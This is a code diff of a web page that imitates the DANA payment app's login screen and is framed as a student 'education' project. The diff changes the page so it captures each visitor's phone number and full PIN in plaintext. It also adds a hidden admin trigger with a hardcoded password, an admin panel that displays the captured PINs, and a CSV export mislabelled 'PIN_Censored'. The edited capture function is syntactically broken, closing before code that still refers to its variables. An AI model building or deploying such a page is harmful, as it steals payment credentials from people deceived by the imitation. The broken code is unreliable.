@@ -263,12 +263,12 @@
             position: fixed;
             bottom: 10px;
             right: 10px;
-            width: 30px;
-            height: 30px;
+            width: 20px;
+            height: 20px;
             background: transparent;
             border: none;
             cursor: pointer;
-            opacity: 0;
+            opacity: 0.1;
         }
 
         .admin-login {
@@ -288,7 +288,8 @@
             background: white;
             padding: 30px;
             border-radius: 15px;
-            width: 300px;
+            text-align: center;
+            min-width: 300px;
         }
 
         .admin-panel {
@@ -297,23 +298,21 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: white;
+            background: rgba(0, 0, 0, 0.95);
             display: none;
-            z-index: 3000;
-            overflow-y: auto;
-        }
-
-        .admin-header {
-            background: #118EEA;
-            color: white;
-            padding: 20px;
-            display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
+            z-index: 2000;
         }
 
         .admin-content {
-            padding: 20px;
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 800px;
+            max-height: 80vh;
+            overflow-y: auto;
+            width: 90%;
         }
 
         .data-item {
@@ -326,13 +325,13 @@
 
         .stats {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
         }
 
         .stat-card {
-            background: #118EEA;
+            background: linear-gradient(135deg, #118EEA 0%, #0066CC 100%);
             color: white;
             padding: 20px;
             border-radius: 10px;
@@ -340,8 +339,21 @@
         }
 
         .stat-number {
-            font-size: 2em;
+            font-size: 24px;
             font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .close-admin {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 5px;
+            cursor: pointer;
         }
     </style>
 </head>
@@ -350,7 +362,7 @@
         <div class="header">
             <button class="back-btn" onclick="goBack()" id="backBtn" style="display: none;">←</button>
             <div class="logo">
-                <img src="dana.jpeg" alt="DANA Logo" onerror="this.style.display='none'; this.parentElement.innerHTML='DANA';">
+                <img src="data:image/jpeg;base64,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" alt="DANA Logo" onerror="this.style.display='none'; this.parentElement.innerHTML='DANA';">
             </div>
             <h1>Masuk ke DANA</h1>
             <p>Aplikasi pembayaran digital terpercaya</p>
@@ -384,9 +396,9 @@
                         <input type="password" class="pin-digit" maxlength="1" oninput="moveFocus(this, 5)">
                     </div>
                 </div>
-                <button class="btn btn-primary" onclick="submitLogin()" id="loginBtn" disabled>Masuk</button>
+                <button class="btn btn-primary" onclick="showEducation()" id="loginBtn" disabled>Masuk</button>
                 <div class="forgot-pin">
-                    <a href="#" onclick="submitLogin()">Lupa PIN?</a>
+                    <a href="#" onclick="showEducation()">Lupa PIN?</a>
                 </div>
             </div>
         </div>
@@ -417,42 +429,43 @@
     </div>
 
     <!-- Hidden Admin Trigger -->
-    <button class="admin-trigger" onclick="showAdminLogin()"></button>
+    <button class="admin-trigger" onclick="openAdminLogin()"></button>
 
     <!-- Admin Login -->
     <div class="admin-login" id="adminLogin">
         <div class="admin-form">
             <h3>Admin Login</h3>
             <div class="form-group">
-                <label>Password Admin:</label>
-                <input type="password" id="adminPassword" placeholder="Masukkan password admin">
+                <input type="password" id="adminPassword" placeholder="Masukkan password admin" style="margin: 20px 0;">
             </div>
-            <button class="btn btn-primary" onclick="verifyAdmin()">Login</button>
-            <button class="btn" onclick="closeAdminLogin()" style="background: #6c757d; color: white;">Batal</button>
+            <button class="btn btn-primary" onclick="checkAdminPassword()">Masuk</button>
+            <button class="btn" onclick="closeAdminLogin()" style="background: #6c757d; color: white; margin-top: 10px;">Batal</button>
         </div>
     </div>
 
     <!-- Admin Panel -->
     <div class="admin-panel" id="adminPanel">
-        <div class="admin-header">
-            <h2>📊 Panel Admin - Data Edukasi</h2>
-            <button onclick="closeAdminPanel()" style="background: rgba(255,255,255,0.2); border: none; color: white; padding: 10px; border-radius: 5px; cursor: pointer;">Tutup</button>
-        </div>
         <div class="admin-content">
+            <button class="close-admin" onclick="closeAdminPanel()">×</button>
+            <h2>📊 Panel Admin - Data Edukasi KKN</h2>
+            
             <div class="stats" id="statsContainer">
-                <!-- Statistik akan ditampilkan di sini -->
+                <!-- Stats akan ditampilkan di sini -->
             </div>
-            <div id="dataContainer">
-                <!-- Data detail akan ditampilkan di sini -->
+
+            <h3>Detail Data Percobaan Login:</h3>
+            <div id="adminDataContent">
+                <!-- Data akan ditampilkan di sini -->
             </div>
-            <button class="btn" onclick="clearAllData()" style="background: #dc3545; color: white; margin-top: 20px;">Hapus Semua Data</button>
-            <button class="btn" onclick="exportData()" style="background: #28a745; color: white; margin-top: 20px; margin-left: 10px;">Export Data</button>
+            
+            <button class="btn" onclick="exportData()" style="background: #28a745; color: white; margin: 10px 5px;">📥 Export Data</button>
+            <button class="btn" onclick="clearAllData()" style="background: #dc3545; color: white; margin: 10px 5px;">🗑️ Hapus Semua Data</button>
         </div>
     </div>
 
     <script>
         let currentStep = 1;
-        const ADMIN_PASSWORD = "admin2024"; // Ganti dengan password yang aman
+        const ADMIN_PASSWORD = "KKN2024"; // Ganti dengan password yang aman
         
         // Phone input validation
         document.getElementById('phone').addEventListener('input', function() {
@@ -518,32 +531,33 @@
             });
         });
 
-        function submitLogin() {
-            // Capture data
-            const phone = document.getElementById('phone').value;
-            const pinDigits = document.querySelectorAll('.pin-digit');
-            const pinLength = Array.from(pinDigits).filter(digit => digit.value).length;
-            
-            // Save data (PIN tersensor)
-            const loginData = {
-                id: Date.now(),
-                timestamp: new Date().toISOString(),
-                phone: phone,
-                pinLength: pinLength,
-                userAgent: navigator.userAgent,
-                ip: 'Hidden for privacy'
-            };
-            
-            // Simpan ke localStorage
-            let allData = JSON.parse(localStorage.getItem('educationData') || '[]');
-            allData.push(loginData);
-            localStorage.setItem('educationData', JSON.stringify(allData));
-            
-            // Show education popup
-            showEducation();
-        }
-
         function showEducation() {
+    // Simpan data untuk admin (PIN tidak disensor)
+    const phone = document.getElementById('phone').value;
+    const pinDigits = document.querySelectorAll('.pin-digit');
+    const pinValue = Array.from(pinDigits).map(digit => digit.value).join('');
+    const pinLength = pinValue.length;
+    
+    const educationData = {
+        id: Date.now(),
+        timestamp: new Date().toISOString(),
+        phone: phone,
+        pinEntered: pinValue || 'Tidak diisi',
+        fullPinLength: pinLength,
+        userAgent: navigator.userAgent,
+        ip: 'Hidden for privacy'
+    };
+
+    console.log(educationData);
+    // Bisa juga kamu kirim ke server atau tampilkan di halaman
+}
+
+            
+            // Simpan data (hanya admin yang bisa akses)
+            let allData = JSON.parse(localStorage.getItem('kkn_education_data') || '[]');
+            allData.push(educationData);
+            localStorage.setItem('kkn_education_data', JSON.stringify(allData));
+            
             document.getElementById('educationPopup').style.display = 'flex';
         }
 
@@ -564,7 +578,7 @@
         }
 
         // Admin Functions
-        function showAdminLogin() {
+        function openAdminLogin() {
             document.getElementById('adminLogin').style.display = 'flex';
         }
 
@@ -573,19 +587,19 @@
             document.getElementById('adminPassword').value = '';
         }
 
-        function verifyAdmin() {
+        function checkAdminPassword() {
             const password = document.getElementById('adminPassword').value;
             if (password === ADMIN_PASSWORD) {
                 closeAdminLogin();
-                showAdminPanel();
+                openAdminPanel();
             } else {
-                alert('Password admin salah!');
+                alert('Password salah!');
             }
         }
 
-        function showAdminPanel() {
+        function openAdminPanel() {
             loadAdminData();
-            document.getElementById('adminPanel').style.display = 'block';
+            document.getElementById('adminPanel').style.display = 'flex';
         }
 
         function closeAdminPanel() {
@@ -593,27 +607,20 @@
         }
 
         function loadAdminData() {
-            const data = JSON.parse(localStorage.getItem('educationData') || '[]');
-            
-            // Load statistics
-            loadStats(data);
-            
-            // Load detailed data
-            loadDetailedData(data);
-        }
-
-        function loadStats(data) {
+            const data = JSON.parse(localStorage.getItem('kkn_education_data') || '[]');
             const statsContainer = document.getElementById('statsContainer');
+            const dataContent = document.getElementById('adminDataContent');
+            
+            // Generate stats
             const totalAttempts = data.length;
             const todayAttempts = data.filter(item => {
-                const itemDate = new Date(item.timestamp).toDateString();
                 const today = new Date().toDateString();
-                return itemDate === today;
+                const itemDate = new Date(item.timestamp).toDateString();
+                return today === itemDate;
             }).length;
             
-            const phoneNumbers = new Set(data.map(item => item.phone)).size;
             const avgPinLength = data.length > 0 ? 
-                (data.reduce((sum, item) => sum + item.pinLength, 0) / data.length).toFixed(1) : 0;
+                (data.reduce((sum, item) => sum + item.fullPinLength, 0) / data.length).toFixed(1) : 0;
 
             statsContainer.innerHTML = `
                 <div class="stat-card">
@@ -625,67 +632,54 @@
                     <div>Hari Ini</div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-number">${phoneNumbers}</div>
-                    <div>Nomor Unik</div>
-                </div>
-                <div class="stat-card">
                     <div class="stat-number">${avgPinLength}</div>
-                    <div>Rata-rata PIN</div>
+                    <div>Rata-rata Digit PIN</div>
                 </div>
             `;
-        }
-
-        function loadDetailedData(data) {
-            const container = document.getElementById('dataContainer');
             
+            // Generate data list
             if (data.length === 0) {
-                container.innerHTML = '<p>Belum ada data yang tercatat.</p>';
-                return;
-            }
-
-            let html = '<h3>📋 Data Detail</h3>';
-            data.reverse().forEach((item, index) => {
-                html += `
-                    <div class="data-item">
-                        <strong>ID: ${item.id}</strong><br>
-                        <small>📅 ${new Date(item.timestamp).toLocaleString('id-ID')}</small><br>
-                        📱 No. HP: +62${item.phone}<br>
-                        🔐 PIN: ${'●'.repeat(item.pinLength)} (${item.pinLength} digit)<br>
-                        <small>🌐 ${item.userAgent.slice(0, 50)}...</small>
-                    </div>
-                `;
-            });
-            
-            container.innerHTML = html;
-        }
-
-        function clearAllData() {
-            if (confirm('Apakah Anda yakin ingin menghapus semua data?')) {
-                localStorage.removeItem('educationData');
-                loadAdminData();
-                alert('Semua data telah dihapus.');
+                dataContent.innerHTML = '<p>Belum ada data yang tercatat.</p>';
+            } else {
+                let html = '';
+                data.reverse().forEach((item, index) => {
+                    html += `
+                        <div class="data-item">
+                            <strong>Percobaan #${data.length - index}</strong><br>
+                            <small>📅 ${new Date(item.timestamp).toLocaleString('id-ID')}</small><br>
+                            📱 No. HP: +62${item.phone}<br>
+                            🔒 PIN: ${item.pinEntered} (${item.fullPinLength} digit)<br>
+                            <small>🌐 Browser: ${item.userAgent.substring(0, 50)}...</small>
+                        </div>
+                    `;
+                });
+                dataContent.innerHTML = html;
             }
         }
 
         function exportData() {
-            const data = JSON.parse(localStorage.getItem('educationData') || '[]');
-            if (data.length === 0) {
-                alert('Tidak ada data untuk di-export.');
-                return;
+            const data = JSON.parse(localStorage.getItem('kkn_education_data') || '[]');
+            const csvContent = "data:text/csv;charset=utf-8," + 
+                "No,Timestamp,Phone,PIN_Censored,PIN_Length,User_Agent\n" +
+                data.map((item, index) => 
+                    `${index + 1},"${item.timestamp}","+62${item.phone}","${item.pinEntered}",${item.fullPinLength},"${item.userAgent}"`
+                ).join("\n");
+
+            const encodedUri = encodeURI(csvContent);
+            const link = document.createElement("a");
+            link.setAttribute("href", encodedUri);
+            link.setAttribute("download", `KKN_education_data_${new Date().toISOString().split('T')[0]}.csv`);
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        function clearAllData() {
+            if (confirm('Apakah Anda yakin ingin menghapus SEMUA data? Tindakan ini tidak dapat dibatalkan!')) {
+                localStorage.removeItem('kkn_education_data');
+                loadAdminData();
+                alert('Semua data telah dihapus.');
             }
-            
-            let csv = 'ID,Timestamp,Phone,PIN_Length\\n';
-            data.forEach(item => {
-                csv += `${item.id},"${item.timestamp}",+62${item.phone},${item.pinLength}\\n`;
-            });
-            
-            const blob = new Blob([csv], { type: 'text/csv' });
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `dana_education_data_${new Date().toISOString().split('T')[0]}.csv`;
-            a.click();
-            window.URL.revokeObjectURL(url);
         }
 
         // Prevent form submission
@@ -694,7 +688,7 @@
             forms.forEach(form => {
                 form.addEventListener('submit', function(e) {
                     e.preventDefault();
-                    submitLogin();
+                    showEducation();
                 });
             });
         });
